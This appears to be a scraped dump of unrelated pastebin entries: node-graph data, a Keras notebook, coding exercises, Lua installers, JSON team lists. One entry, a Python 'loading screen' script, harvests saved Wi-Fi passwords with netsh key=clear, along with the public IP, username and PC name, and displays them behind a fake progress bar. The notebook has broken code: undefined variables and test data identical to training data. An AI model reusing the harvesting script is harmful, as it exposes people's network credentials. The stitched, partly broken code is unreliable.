					},
					ViewInfo = PipeRouterInfo { Pos = { -55, 7.25721 } },
				},
				GM_BM_4 = BitmapMask {
					CtrlWZoom = false,
					CtrlWShown = false,
					NameSet = true,
					Inputs = {
						Filter = Input { Value = FuID { ""Fast Gaussian"" }, },
						MaskWidth = Input { Value = 1080, },
						MaskHeight = Input { Value = 1080, },
						PixelAspect = Input { Value = { 1, 1 }, },
						UseFrameFormatSettings = Input { Value = 1, },
						ClippingMode = Input { Value = FuID { ""None"" }, },
						Image = Input {
							SourceOp = ""GM_PR_4"",
							Source = ""Output"",
						},
						Channel = Input { Value = FuID { ""Luminance"" }, },
						CompositeNest = Input { Value = 1, },
					},
					ViewInfo = OperatorInfo { Pos = { 55, 40.2572 } },
					UserControls = ordered() { Offset = { LINKS_Name = ""Offset"", INP_Integer = false, LINKID_DataType = ""Number"", ICS_ControlPage = ""Controls"", INPID_InputControl = ""ScrewControl"", INP_MinScale = -0.5, INP_MaxScale = 0.5, INP_Default = 0, }, InputNest = { LBLC_DropDownButton = true, INPID_InputControl = ""LabelControl"", LBLC_NumInputs = 5, IC_ControlPage = 0, LINKS_Name = ""Input Settings"", INP_Default = 0, }, GradientNest = { LBLC_DropDownButton = true, INPID_InputControl = ""LabelControl"", LBLC_NumInputs = 7, IC_ControlPage = 0, LINKS_Name = ""Gradient Settings"", INP_Default = 1, }, CompositeNest = { LBLC_DropDownButton = true, INPID_InputControl = ""LabelControl"", LBLC_NumInputs = 13, IC_ControlPage = 0, LINKS_Name = ""Composite Settings"", INP_Default = 0, }, MaskNest = { LBLC_DropDownButton = true, INPID_InputControl = ""LabelControl"", LBLC_NumInputs = 5, IC_ControlPage = 0, LINKS_Name = ""Mask Settings"", INP_Default = 0, } }
				},
				GM_FN_4 = FastNoise {
					CtrlWShown = false,
					NameSet = true,
					Inputs = {
						GlobalOut = Input { Value = 78, },
						Width = Input {
							Value = 1080,
							Expression = ""GM_BM_4.Image.OriginalWidth"",
						},
						Height = Input {
							Value = 2160,
							Expression = ""GM_BM_4.Image.OriginalHeight"",
						},
						[""Gamut.SLogVersion""] = Input { Value = FuID { ""SLog2"" }, },
						Detail = Input { Value = 0, },
						Brightness = Input { Value = 1, },
						Type = Input { Value = 1, },
						Color1Alpha = Input { Value = 1, },
						Gradient = Input {
							Value = Gradient {
								Colors = {
									[0] = { 0, 0.333, 1, 1 },
									[0.5] = { 1, 0, 0.2, 1 },
									[1] = { 1, 0.8, 0, 1 }
								}
							},
						},
						GradientInterpolationMethod = Input { Value = 1, },
						Offset = Input {
							Value = 0.5,
							Expression = ""GM_BM_4.Offset+0.5"",
						},
						Repeat = Input { Value = 2, },
						NoiseBrightnessMap = Input {
							SourceOp = ""GM_BM_4"",
							Source = ""Mask"",
						},
					},
					ViewInfo = OperatorInfo { Pos = { 55, 73.2572 } },
				},
				GM_Mask_4 = Merge {
					CtrlWShown = false,
					NameSet = true,
					Inputs = {
						MultiplyByMask = Input { Value = 1, },
						Background = Input {
							SourceOp = ""GM_PR_4"",
							Source = ""Output"",
						},
						Foreground = Input {
							SourceOp = ""GM_FN_4"",
							Source = ""Output"",
						},
						PerformDepthMerge = Input { Value = 0, },
						EffectMask = Input {
							SourceOp = ""BrightnessContrast1_34"",
							Source = ""Output"",
						}
					},
					ViewInfo = OperatorInfo { Pos = { 55, 106.258 } },
				}
			},
			Colors = { TileColor = { R = 0.584313725490196, G = 0.294117647058824, B = 0.803921568627451 }, }
		},
		Scale3_2 = Scale {
			Inputs = {
				XSize = Input { Value = 0.5, },
				HiQOnly = Input { Value = 0, },
				PixelAspect = Input { Value = { 1, 1 }, },
				Input = Input {
					SourceOp = ""GM_Mask_4"",
					Source = ""Output"",
				},
			},
			ViewInfo = OperatorInfo { Pos = { 1485, 3811.5 } },
		},
		MatteControl1_9 = MatteControl {
			CtrlWZoom = false,
			Inputs = {
				MatteCombine = Input { Value = 5, },
				Filter = Input { Value = FuID { ""Fast Gaussian"" }, },
				[""Garbage.MaskNest""] = Input { Value = 1, },
				[""Garbage.MaskInverted""] = Input { Value = 1, },
				Background = Input {
					SourceOp = ""Scale3_2"",
					Source = ""Output"",
				},
			},
			ViewInfo = OperatorInfo { Pos = { 1485, 3877.5 } },
		}
	}
}"
K5VfV7fA,VK the best confusion matrix DNN CNN,max2201111,Python,Thursday 20th of June 2024 04:20:22 PM CDT,"import numpy as np
import matplotlib.pyplot as plt
import tensorflow as tf
from tqdm.notebook import tqdm_notebook
from IPython.display import display, Javascript
from google.colab import files
import os
import shutil
import ast
from sklearn.metrics import confusion_matrix, accuracy_score, precision_score, recall_score, f1_score
import seaborn as sns

display(Javascript('IPython.OutputArea.auto_scroll_threshold = 9999;'))

label_colors = {0: [0, 128, 0], 1: [255, 0, 0]}
label_colors_testing = {0: [0, 128, 0], 1: [255, 0, 0]}

%matplotlib inline

def create_image(data, predictions, label_colors):
    num_rows, num_columns = len(data), len(data[0])
    image = np.zeros((num_rows, num_columns + 1, 3), dtype=np.uint8)
    min_val = np.min(data)
    max_val = np.max(data)
    for i in range(num_rows):
        for j in range(num_columns):
            pixel_value = int(np.interp(data[i][j], [min_val, max_val], [0, 255]))
            image[i, j] = np.array([pixel_value] * 3)
        image[i, -1] = label_colors[predictions[i]]
    return image

def create_imageN(data, predictions, label_colors=None):
    num_training_rows = len(data)
    num_columns = len(data[0])
    image_training = np.zeros((num_training_rows, num_columns + 1, 3), dtype=np.uint8)
    for i in range(num_training_rows):
        for j in range(num_columns):
            pixel_value = int(np.interp(data[i][j], [-3, 3], [0, 255]))
            image_training[i, j] = np.array([pixel_value] * 3)
        if label_colors is not None:
            image_training[i, -1] = label_colors[predictions[i]]
    return image_training

def create_cnn_model(input_shape):
    model = tf.keras.Sequential([
        tf.keras.layers.InputLayer(input_shape=input_shape),
        tf.keras.layers.Reshape((input_shape[0], 1)),
        tf.keras.layers.Conv1D(filters=32, kernel_size=2, activation='relu'),
        tf.keras.layers.MaxPooling1D(pool_size=2),
        tf.keras.layers.Flatten(),
        tf.keras.layers.Dense(64, activation='relu'),
        tf.keras.layers.Dense(1, activation='sigmoid')
    ])
    model.compile(optimizer='adam', loss='binary_crossentropy', metrics=['accuracy'])
    return model

uploaded = files.upload()
for filename in uploaded.keys():
    original_path = f""/content/{filename}""
    destination_path = os.path.join(""/content/"", ""/content/DATA2"")
    shutil.move(original_path, destination_path)
    print(f""Soubor {filename} byl p≈ôesunut do {destination_path}"")

file_path = '/content/DATA2'
with open(file_path, 'r') as file:
    code = file.read()

A_list = ast.literal_eval(code)
A = np.array(A_list)

labels = [results[-1] for results in A]
data = [results[:-1] for results in A]

num_training_rows = 50
num_testing_rows = 50
X_train, X_test, y_train, y_test = data[:num_training_rows], data[:num_testing_rows], labels[:num_training_rows], labels[:num_testing_rows]

mean_values = np.mean(X_train, axis=0)
std_values = np.std(X_train, axis=0)
X_train_normalized = (X_train - mean_values) / std_values
X_test_normalized = (X_test - mean_values) / std_values

# DNN Model
dnn_model = tf.keras.Sequential([
    tf.keras.layers.Dense(128, activation='relu', input_shape=(len(X_train[0]),)),
    tf.keras.layers.Dense(64, activation='relu'),
    tf.keras.layers.Dense(1, activation='sigmoid')
])
dnn_model.compile(optimizer='adam', loss='binary_crossentropy', metrics=['accuracy'])

# Training DNN Model
dnn_accuracy_history = []
epochs = 600

for epoch in tqdm_notebook(range(epochs)):
    history_dnn = dnn_model.fit(X_train_normalized, np.array(y_train), epochs=1, verbose=0, shuffle=False)
    dnn_accuracy_history.append(history_dnn.history['accuracy'][0])

    if epoch == 1:
        y_pred_after_2nd_epoch_dnn = dnn_model.predict(X_test_normalized)
        y_pred_binary_after_2nd_epoch_dnn = [1 if pred >= 0.5 else 0 for pred in y_pred_after_2nd_epoch_dnn]
        image_testing_before_2nd_epoch_dnn = create_image(X_test_normalized, y_pred_binary_after_2nd_epoch_dnn, label_colors_testing)

    if epoch >= epochs-1:
        print(f""HERE HERE Epoch: {epoch}, Epochs: {epochs}\n"")
        sys.stdout.flush()

        # Iterate through new persons
        for idx, personNEW_results in enumerate(new_persons_results, start=1):
            assert len(personNEW_results) == len(X_train[0]), ""Mismatch in the number of features.""
            personNEW_results_normalized = (np.array(personNEW_results) - mean_values) / std_values
            personNEW_prediction_dnn = dnn_model.predict(np.array([personNEW_results_normalized]))
            personNEW_label_dnn = 1 if personNEW_prediction_dnn >= 0.5 else 0
            y_pred_after_50_epochs_dnn = dnn_model.predict(X_test_normalized)
            y_pred_binary_after_50_epochs_dnn = [1 if pred >= 0.5 else 0 for pred in y_pred_after_50_epochs_dnn]
            image_testing_after_50_epochs_dnn = create_image(X_test_normalized, y_pred_binary_after_50_epochs_dnn, label_colors_testing)
            image_personNEW_dnn = create_imageN([personNEW_results_normalized], [personNEW_label_dnn], label_colors)
            plt.figure(figsize=(5, 5))
            plt.imshow(image_personNEW_dnn)
            plt.title(f""New Person {idx} - DNN\nLabel: {personNEW_label_dnn}, Prediction: {personNEW_prediction_dnn}"")
            plt.axis(""off"")
            plt.show()

# CNN Model
cnn_model = create_cnn_model((len(X_train[0]), 1))

# Preparing data for CNN
X_train_normalized_cnn = X_train_normalized.reshape((X_train_normalized.shape[0], X_train_normalized.shape[1], 1))
X_test_normalized_cnn = X_test_normalized.reshape((X_test_normalized.shape[0], X_test_normalized.shape[1], 1))

# Training CNN Model
cnn_accuracy_history = []

for epoch in tqdm_notebook(range(epochs)):
    history_cnn = cnn_model.fit(X_train_normalized_cnn, np.array(y_train), epochs=1, verbose=0, shuffle=False)
    cnn_accuracy_history.append(history_cnn.history['accuracy'][0])

    if epoch == 1:
        y_pred_after_2nd_epoch_cnn = cnn_model.predict(X_test_normalized_cnn)
        y_pred_binary_after_2nd_epoch_cnn = [1 if pred >= 0.5 else 0 for pred in y_pred_after_2nd_epoch_cnn]
        image_testing_before_2nd_epoch_cnn = create_image(X_test_normalized, y_pred_binary_after_2nd_epoch_cnn, label_colors_testing)

    if epoch >= epochs-1:
        print(f""HERE HERE Epoch: {epoch}, Epochs: {epochs}\n"")
        sys.stdout.flush()

        # Iterate through new persons
        for idx, personNEW_results in enumerate(new_persons_results, start=1):
            assert len(personNEW_results) == len(X_train[0]), ""Mismatch in the number of features.""
            personNEW_results_normalized = (np.array(personNEW_results) - mean_values) / std_values
            personNEW_results_normalized_cnn = personNEW_results_normalized.reshape((len(personNEW_results_normalized), 1))
            personNEW_prediction_cnn = cnn_model.predict(np.array([personNEW_results_normalized_cnn]))
            personNEW_label_cnn = 1 if personNEW_prediction_cnn >= 0.5 else 0
            y_pred_after_50_epochs_cnn = cnn_model.predict(X_test_normalized_cnn)
            y_pred_binary_after_50_epochs_cnn = [1 if pred >= 0.5 else 0 for pred in y_pred_after_50_epochs_cnn]
            image_testing_after_50_epochs_cnn = create_image(X_test_normalized, y_pred_binary_after_50_epochs_cnn, label_colors_testing)
            image_personNEW_cnn = create_imageN([personNEW_results_normalized], [personNEW_label_cnn], label_colors)
            plt.figure(figsize=(5, 5))
            plt.imshow(image_personNEW_cnn)
            plt.title(f""New Person {idx} - CNN\nLabel: {personNEW_label_cnn}, Prediction: {personNEW_prediction_cnn}"")
            plt.axis(""off"")
            plt.show()

# Display the images
plt.figure(figsize=(25, 15))
plt.subplot(2, 2, 1)
plt.imshow(image_training)
plt.title(""Training Data"")
plt.axis(""off"")

plt.subplot(2, 2, 2)
plt.imshow(image_testing_before_2nd_epoch_dnn)
plt.title(""Testing Data (2nd Epoch) - DNN"")
plt.axis(""off"")

plt.subplot(2, 2, 3)
plt.imshow(image_testing_after_50_epochs_dnn)
plt.title(f""Testing Data ({epochs} Epochs) - DNN"")
plt.axis(""off"")

plt.subplot(2, 2, 4)
plt.imshow(image_personNEW_dnn)
plt.title(f""New Person - DNN\nLabel: {personNEW_label_dnn},[{personNEW_prediction_dnn}]"")
plt.axis(""off"")

plt.figure(figsize=(12, 5))
plt.plot(range(1, epochs + 1), dnn_accuracy_history, marker='o')
plt.title('DNN Accuracy Over Epochs')
plt.xlabel('Epochs')
plt.ylabel('Accuracy')
plt.grid()

plt.figure(figsize=(25, 15))
plt.subplot(2, 2, 1)
plt.imshow(image_training)
plt.title(""Training Data"")
plt.axis(""off"")

plt.subplot(2, 2, 2)
plt.imshow(image_testing_before_2nd_epoch_cnn)
plt.title(""Testing Data (2nd Epoch) - CNN"")
plt.axis(""off"")

plt.subplot(2, 2, 3)
plt.imshow(image_testing_after_50_epochs_cnn)
plt.title(f""Testing Data ({epochs} Epochs) - CNN"")
plt.axis(""off"")

plt.subplot(2, 2, 4)
plt.imshow(image_personNEW_cnn)
plt.title(f""New Person - CNN\nLabel: {personNEW_label_cnn},[{personNEW_prediction_cnn}]"")
plt.axis(""off"")

plt.figure(figsize=(12, 5))
plt.plot(range(1, epochs + 1), cnn_accuracy_history, marker='o')
plt.title('CNN Accuracy Over Epochs')
plt.xlabel('Epochs')
plt.ylabel('Accuracy')
plt.grid()

# Confusion Matrix and Performance Metrics for DNN
dnn_predictions = (dnn_model.predict(X_test_normalized) > 0.5).astype(int)
dnn_conf_matrix = confusion_matrix(y_test, dnn_predictions)
print(f""Confusion Matrix for DNN:\n{dnn_conf_matrix}"")
dnn_accuracy = accuracy_score(y_test, dnn_predictions)
dnn_precision = precision_score(y_test, dnn_predictions)
dnn_recall = recall_score(y_test, dnn_predictions)
dnn_f1 = f1_score(y_test, dnn_predictions)
print(f""DNN Accuracy: {dnn_accuracy:.4f}"")
print(f""DNN Precision: {dnn_precision:.4f}"")
print(f""DNN Recall: {dnn_recall:.4f}"")
print(f""DNN F1 Score: {dnn_f1:.4f}"")

# Confusion Matrix and Performance Metrics for CNN
cnn_predictions = (cnn_model.predict(X_test_normalized_cnn) > 0.5).astype(int)
cnn_conf_matrix = confusion_matrix(y_test, cnn_predictions)
print(f""Confusion Matrix for CNN:\n{cnn_conf_matrix}"")
cnn_accuracy = accuracy_score(y_test, cnn_predictions)
cnn_precision = precision_score(y_test, cnn_predictions)
cnn_recall = recall_score(y_test, cnn_predictions)
cnn_f1 = f1_score(y_test, cnn_predictions)
print(f""CNN Accuracy: {cnn_accuracy:.4f}"")
print(f""CNN Precision: {cnn_precision:.4f}"")
print(f""CNN Recall: {cnn_recall:.4f}"")
print(f""CNN F1 Score: {cnn_f1:.4f}"")

# Display confusion matrices
plt.figure(figsize=(12, 5))

plt.subplot(1, 2, 1)
sns.heatmap(dnn_conf_matrix, annot=True, fmt='d', cmap='Blues')
plt.xlabel('Predicted')
plt.ylabel('Actual')
plt.title('DNN Confusion Matrix')

plt.subplot(1, 2, 2)
sns.heatmap(cnn_conf_matrix, annot=True, fmt='d', cmap='Blues')
plt.xlabel('Predicted')
plt.ylabel('Actual')
plt.title('CNN Confusion Matrix')

plt.show()"
VDUfV0WK,youtube.com/live_chat? - Remove Live Chat Policy reminder,EdFrees,CSS,Thursday 20th of June 2024 03:06:26 PM CDT,"yt-live-chat-viewer-engagement-message-renderer > #card {
   display: none !important;
}"
aUg2EJmV,03. Enrollment,Nenogzar,Python,Thursday 20th of June 2024 03:04:21 PM CDT,"def gather_credits(needed_credits, *courses_info):
    gathered_credits = 0
    enrolled_courses = []
 
    for course_name, course_credits in courses_info:
        if gathered_credits >= needed_credits:
            break
        if course_name not in enrolled_courses:
            enrolled_courses.append(course_name)
            gathered_credits += course_credits
 
    if gathered_credits >= needed_credits:
        return f""Enrollment finished! Maximum credits: {gathered_credits}.\nCourses: {', '.join(sorted(enrolled_courses))}""
    
    return f""You need to enroll in more courses! You have to gather {needed_credits - gathered_credits} credits more."""
HHrSXYbF,dialer server,Volpe42,Lua,Thursday 20th of June 2024 03:03:43 PM CDT,"local PREFIX = ""https://raw.githubusercontent.com/Ktlo/pocket-stargate""
local BRANCH = ""develop""

--------------------------------

local function typeY()
    write(""Do you want to continue? (Type Y for continue): "")
    local read = read(nil, nil, nil, ""N"")
    if read ~= 'Y' then
        print(""Exiting..."")
        return true
    end
end

print(""Installing PSG server..."")
print(""Checking peripherals..."")
if not (peripheral.find ""advanced_crystal_interface"" or peripheral.find ""crystal_interface"" or peripheral.find ""basic_interface"") then
    print(""Stargate interface not found!"")
    if typeY() then return end
end
if not peripheral.find(""modem"", function(_, modem) return modem.isWireless() end) then
    print(""Wireless modem not found!"")
    if typeY() then return end
end
print(""Peripherals OK"")

write(""Name current solar system: "")
local solarSystem = read(nil, nil, nil, ""sgjourney:terra"")

local galaxies = {}

print(""Please, enter current galaxies names (empty input means end of list)"")
while true do
    write(""Name galaxy #""..tostring(#galaxies + 1).."": "")
    local galaxy = read(nil, nil, nil, #galaxies == 0 and ""sgjourney:milky_way"" or nil)
    if galaxy == """" then break end
    table.insert(galaxies, galaxy)
end

print(""Modifying configuration file..."")
settings.set(""solarSystem"", solarSystem)
settings.set(""galaxies"", galaxies)
settings.save()
print(""Configuration OK"")

print(""Downloading files..."")
local function wget(side, filename)
    local fullUrl = PREFIX..""/""..BRANCH..""/""..side..""/""..filename
    shell.execute(""wget"", fullUrl, filename)
end

wget(""common"", ""concurrent.lua"")
wget(""server"", ""startup.lua"")

print(""Files downloaded!"")
print(""Restarting..."")

shell.execute 'reboot'"
0GUGLw6r,dialer client,Volpe42,Lua,Thursday 20th of June 2024 03:02:57 PM CDT,"local PREFIX = ""https://raw.githubusercontent.com/Ktlo/pocket-stargate""
local BRANCH = ""develop""

--------------------------------

local function typeY()
    write(""Do you want to continue? (Type Y for continue): "")
    local read = read(nil, nil, nil, ""N"")
    if read ~= 'Y' then
        print(""Exiting..."")
        return true
    end
end

print(""Installing PSG server..."")
print(""Checking peripherals..."")
if not peripheral.find(""modem"", function(_, modem) return modem.isWireless() end) then
    print(""Wireless modem not found!"")
    if typeY() then return end
end
if not pocket then
    print(""This is not a pocket device!"")
    if typeY() then return end
end
print(""Peripherals OK"")

print(""Downloading files..."")
local function wget(side, filename)
    local fullUrl = PREFIX..""/""..BRANCH..""/""..side..""/""..filename
    shell.execute(""wget"", fullUrl, filename)
end

shell.execute(""wget"", ""run"", ""https://basalt.madefor.cc/install.lua"", ""packed"", ""basalt.lua"", ""v1.6.6"")
wget(""common"", ""concurrent.lua"")
wget(""client"", ""addresses.conf"")
wget(""client"", ""addresses.lua"")
wget(""client"", ""stargate.lua"")
wget(""client"", ""psg.lua"")
wget(""client"", ""psg.xml"")

print(""Files downloaded!"")

print(""Your copy of Pocket Stargate is successfully installed!"")
print(""You can modify \""addresses.conf\"" now."")
print(""Execute \""psg\"" command in order to run Pocket Stargate."")"
sKqYzfby,03. Enrollment,Nenogzar,Python,Thursday 20th of June 2024 03:02:27 PM CDT,"def gather_credits(needed_credits, *courses_info):
    gathered_credits = 0
    enrolled_courses = []

    for course_name, course_credits in courses_info:
        if gathered_credits >= needed_credits:
            break
        if course_name not in enrolled_courses:
            enrolled_courses.append(course_name)
            gathered_credits += course_credits

    if gathered_credits >= needed_credits:
        return f""Enrollment finished! Maximum credits: {gathered_credits}.\nCourses: {', '.join(sorted(enrolled_courses))}""
    
    return f""You need to enroll in more courses! You have to gather {needed_credits - gathered_credits} credits more.""

# Example usage:
print(gather_credits(
    80,
    (""Basics"", 27),
))
"
UbzKDz3k,loading_screen_with_wifi_data,Python253,Python,Thursday 20th of June 2024 02:57:57 PM CDT,"#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Filename: loading_screen.py
# Version: 1.0.0
# Author: Jeoi Reqi
 
""""""
Description:
    - This script gathers various system information essential for network management and troubleshooting.
      It retrieves the following details:
        - Public IP address:
            Obtained from an external API endpoint.
        - User details:
            Includes the username currently logged into the system.
        - Computer name:
            Retrieves the local computer's name.
        - Operating system:
            Fetches information about the current operating system.
        - Wi-Fi network information:
            Retrieves SSIDs (Service Set Identifiers) and passwords of previously saved Wi-Fi networks on the machine.
    
    - It presents this information using a simulated loading effect, enhancing user experience with a progress bar visual representation.
    
Requirements:
    - Python 3.x
    - The Following Modules:
        - json
        - urllib
        - subprocess
        - colorama

Functions:
    - get_wifi_passwords():
        Retrieves SSIDs and passwords of saved Wi-Fi networks on the machine.

    - loading():
        Displays system information with a loading bar effect, including IP,
        username, PC name, OS, and Wi-Fi information.

Usage:
    - Ensure Python 3.x is installed.
    - Install required modules using pip (if not already installed):
      
      EXAMPLE:
                'pip install colorama'

    - Run the script.

Additional Notes:
    - The loading function clears the screen and displays information in a loop,
      simulating a loading process with a progress bar.
    - This script requires administrative privileges on Windows to retrieve Wi-Fi passwords.

""""""

import os
import time
import random
from json import load
from urllib.request import urlopen
import subprocess
from colorama import init, Fore, Style

# Initialize colorama
init(autoreset=True)

def get_wifi_passwords():
    """"""
    Retrieves the SSIDs and passwords of saved Wi-Fi networks on the machine.

    Returns:
        wifi_data (str): A formatted string containing SSIDs and passwords.
    """"""
    wifi_data = """"
    try:
        # Get the list of Wi-Fi profiles
        wifi_profiles = subprocess.check_output(""netsh wlan show profiles"", shell=True, text=True).split('\n')
        profiles = [line.split("":"")[1].strip() for line in wifi_profiles if ""All User Profile"" in line]

        for profile in profiles:
            # Get the Wi-Fi password for each profile
            wifi_details = subprocess.check_output(f""netsh wlan show profile name=\""{profile}\"" key=clear"", shell=True, text=True).split('\n')
            password = None
            for line in wifi_details:
                if ""Key Content"" in line:
                    password = line.split("":"")[1].strip()
                    break

            wifi_data += f""SSID: {profile}, Password: {password if password else 'None'}\n""

    except Exception as e:
        wifi_data += f""Error retrieving Wi-Fi passwords: {e}\n""

    return wifi_data
    
def loading():
    """"""
    Displays system information with a loading bar effect.

    Retrieves the public IP, username, computer name, operating system, and Wi-Fi information,
    then displays this information while simulating a loading process with a progress bar.
    """"""
    # Gather system information
    ip_info = load(urlopen('https://api.myip.com/'))
    wifi_info = get_wifi_passwords()
    img = f""""""
IP: {ip_info['ip']}
Username: {os.getlogin()}
PC Name: {os.getenv('COMPUTERNAME')}
Operating System: {os.getenv('OS')}

Known Wi-Fi Networks + Passwords:

{wifi_info}
    """"""

    # Display system information with a loading bar
    for i in range(40):
        os.system('cls' if os.name == 'nt' else 'clear')  # Clear the screen
        print(img)
        progress = (Fore.GREEN + ""#"" * (i + 1) + Style.RESET_ALL).ljust(40, '-')
        print(f""[{progress}]"")
        time.sleep(random.uniform(0.025, 0.075))  # Random delay between 0.025 and 0.075 seconds

if __name__ == '__main__':
    loading()
    print(""\n\n\tAll processes completed.\n\n\tExiting Program...   GoodBye!\n"")
"
kRGF0tkG,Untitled,swordiemen,JSON,Thursday 20th of June 2024 02:45:05 PM CDT,"[
{
""Id"": ""team1"",
""Name"": ""Team 1"",
""ShortName"": ""TM1"",
""LogoUrl"": """",
""CountryFlagUrl"": ""file://Media/Flags/NED.dds"",
""Messages"": {
""TrackPoint"": {
""Customize"": [
""SoundUrl"",
""MessageDelay""
],
""MessageDelay"": 700
},
""TrackWin"": {
""Customize"": [
""SoundUrl""
]
}
},
""Players"": [
{
""AccountId"": ""5ddd311e-fe50-4b6b-b5f9-636e52216b51"",
""Name"": ""Treggeur"",
""PhotoUrl"": """"
},
{
""AccountId"": ""39f73395-9c46-4e52-8e8b-690ab8e499ae"",
""Name"": ""Swordie."",
""PhotoUrl"": """"
}
]
},
{
""Id"": ""team2"",
""Name"": ""Team 2"",
""ShortName"": ""TM2"",
""LogoUrl"": """",
""CountryFlagUrl"": ""file://Media/Flags/NED.dds"",
""Messages"": {
""TrackPoint"": {
""Customize"": [
""SoundUrl"",
""MessageDelay""
],
""MessageDelay"": 700
},
""TrackWin"": {
""Customize"": [
""SoundUrl""
]
}
},
""Players"": [
{
""AccountId"": ""94232bb9-9774-41f8-9016-3e653581ce9a"",
""Name"": ""ThijnHD"",
""PhotoUrl"": """"
},
{
""AccountId"": ""5cb66649-54c5-4623-830f-651b17010658"",
""Name"": ""KingTom1.1"",
""PhotoUrl"": """"
}
]
}
]"
4yXJzHkZ,Algoverse_adesh_23,kucheasysa,Python,Thursday 20th of June 2024 02:44:43 PM CDT,"class Solution:
    def countNegatives(self, grid: List[List[int]]) -> int:
        count = 0
        for i in grid:
            for j in i:
                if j< 0 :
                    count = count +1 
        return count"
r4DWBKM9,Untitled,Chefir,C#,Thursday 20th of June 2024 02:39:01 PM CDT,"Dictionary<string, string> countriesCapitals = new Dictionary<string, string>();

countriesCapitals.Add(""–ê–≤—Å—Ç—Ä–∞–ª–∏—è"", ""–ö–∞–Ω–±—É—Ä—Ä–∞"");
countriesCapitals.Add(""–¢—É—Ä—Ü–∏—è"", ""–ê–Ω–∫–∞—Ä–∞"");
countriesCapitals.Add(""–®–≤–µ–π—Ü–∞—Ä–∏—è"", ""–ë–µ—Ä–Ω"");
bool isOpen = true;
Console.WriteLine(""–°–ø–∏—Å–∫–æ —Å—Ç—Ä–∞–Ω: "");

foreach (var countriesCapital in countriesCapitals)
{
    Console.WriteLine(countriesCapital.Key);
}

while (isOpen)
{
    Console.WriteLine(""\n–í–≤–µ–¥–∏—Ç–µ –Ω–∞–∑–≤–∞–Ω–∏–µ —Å—Ç—Ä–∞–Ω—ã –∏ —Å–ø–∏—Å–∫–∞, –∏ –≤–∞–º –≤—ã–¥–∞—Å—Ç –µ–µ —Å—Ç–∞–ª–∏—Ü—É: "");
    string userInput = Console.ReadLine();

    if (countriesCapitals.ContainsKey(userInput))
    {
        Console.WriteLine(countriesCapitals[userInput]);
    }
    else
    {
        Console.WriteLine(""–¢–∞–∫–æ–≥–æ —Å–ª–æ–≤–∞ –Ω–µ—Ç –≤ —Å–ø–∏—Å–∫–µ."");
    }"
dSnLMts6,Algoverse_adesh_22,kucheasysa,Python,Thursday 20th of June 2024 02:31:41 PM CDT,"
class Solution:
    def diagonalSum(self, mat: List[List[int]]) -> int:
        n = len(mat)
        m = 0
        for i in range(n) :
            m += mat[i][i] + mat[i][n - i - 1]
        if n % 2 :
            w = n // 2
            m -= mat[w][w]
        return m"
5vLX7hiz,Untitled,swordiemen,JSON,Thursday 20th of June 2024 02:27:23 PM CDT,"[
    {
        ""Id"": ""fryslan"",
        ""Name"": ""Fryslan"",
        ""ShortName"": ""FRY"",
        ""LogoUrl"": """",
        ""CountryFlagUrl"": ""file://Media/Flags/NED.dds"",
        ""Messages"": {
            ""TrackPoint"": {
                ""Customize"": [
                    ""SoundUrl"",
                    ""MessageDelay""
                ],
                ""MessageDelay"": 700
            },
            ""TrackWin"": {
                ""Customize"": [
                    ""SoundUrl""
                ]
            }
        },
        ""Players"": [
            {
                ""AccountId"": ""23274648-738e-4216-a065-2a118f978c9d"",
                ""Name"": ""Knyntsje"",
                ""PhotoUrl"": """"
            },
            {
                ""AccountId"": ""541cd232-0daa-48c4-8e59-5d9d70371f51"",
                ""Name"": ""Vixxa.wp"",
                ""PhotoUrl"": """"
            }
        ]
    },
    {
        ""Id"": ""moddergeitjes"",
        ""Name"": ""Moddergeitjes"",
        ""ShortName"": ""MOD"",
        ""LogoUrl"": """",
        ""CountryFlagUrl"": ""file://Media/Flags/NED.dds"",
        ""Messages"": {
            ""TrackPoint"": {
                ""Customize"": [
                    ""SoundUrl"",
                    ""MessageDelay""
                ],
                ""MessageDelay"": 700
            },
            ""TrackWin"": {
                ""Customize"": [
                    ""SoundUrl""
                ]
            }
        },
        ""Players"": [
            {
                ""AccountId"": ""1e9eaf8f-a16e-4c78-874b-bc727996159a"",
                ""Name"": ""Javas.."",
                ""PhotoUrl"": """"
            },
            {
                ""AccountId"": ""26f45a76-8b19-4be4-9950-f9e0367e4860"",
                ""Name"": ""VennTM"",
                ""PhotoUrl"": """"
            }
        ]
    },
    {
        ""Id"": ""tacokanon"",
        ""Name"": ""Tacokanon"",
        ""ShortName"": ""TAC"",
        ""LogoUrl"": """",
        ""CountryFlagUrl"": ""file://Media/Flags/NED.dds"",
        ""Messages"": {
            ""TrackPoint"": {
                ""Customize"": [
                    ""SoundUrl"",
                    ""MessageDelay""
                ],
                ""MessageDelay"": 700
            },
            ""TrackWin"": {
                ""Customize"": [
                    ""SoundUrl""
                ]
            }
        },
        ""Players"": [
            {
                ""AccountId"": ""9b71ebf0-86c8-4145-be11-db6941cb8f1a"",
                ""Name"": ""CannonTM"",
                ""PhotoUrl"": """"
            },
            {
                ""AccountId"": ""a280bf5a-a5b9-492e-9161-c69f2d159fad"",
                ""Name"": ""NeoTako"",
                ""PhotoUrl"": """"
            }
        ]
    },
    {
        ""Id"": ""safetycar"",
        ""Name"": ""Safety Car"",
        ""ShortName"": ""SC"",
        ""LogoUrl"": ""https://i.imgur.com/kdTATYs.png"",
        ""CountryFlagUrl"": ""file://Media/Flags/NED.dds"",
        ""Messages"": {
            ""TrackPoint"": {
                ""Customize"": [
                    ""SoundUrl"",
                    ""MessageDelay""
                ],
                ""MessageDelay"": 700
            },
            ""TrackWin"": {
                ""Customize"": [
                    ""SoundUrl""
                ]
            }
        },
        ""Players"": [
            {
                ""AccountId"": ""f22e00ec-ed51-4643-8e89-da824c4b5e11"",
                ""Name"": ""B0kit0"",
                ""PhotoUrl"": """"
            },
            {
                ""AccountId"": ""a512e7a7-d655-4395-87da-502be7f5aa9a"",
                ""Name"": ""Jadey-"",
                ""PhotoUrl"": """"
            }
        ]
    },
    {
        ""Id"": ""splitnl"",
        ""Name"": ""SplitNL"",
        ""ShortName"": ""SNL"",
        ""LogoUrl"": """",
        ""CountryFlagUrl"": ""file://Media/Flags/NED.dds"",
        ""Messages"": {
            ""TrackPoint"": {
                ""Customize"": [
                    ""SoundUrl"",
                    ""MessageDelay""
                ],
                ""MessageDelay"": 700
            },
            ""TrackWin"": {
                ""Customize"": [
                    ""SoundUrl""
                ]
            }
        },
        ""Players"": [
            {
                ""AccountId"": ""e8f35258-b507-487d-b470-52587d1445a6"",
                ""Name"": ""Denniss.."",
                ""PhotoUrl"": """"
            },
            {
